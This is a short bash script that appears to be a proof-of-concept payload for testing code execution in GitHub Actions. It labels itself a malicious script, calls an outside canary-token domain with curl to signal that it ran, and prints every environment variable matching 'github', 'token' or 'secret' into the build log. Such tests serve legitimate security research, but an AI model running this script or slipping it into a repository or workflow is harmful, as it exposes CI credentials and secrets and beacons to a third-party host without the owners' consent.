#!/bin/bash
echo "=== MALICIOUS SCRIPT EXECUTED ==="
echo "Testing code execution in GitHub Actions"
curl -s http://canarytokendomain.com/test || echo "curl failed"
echo "Environment:"
env | grep -i "github\|token\|secret"
echo "=== END ==="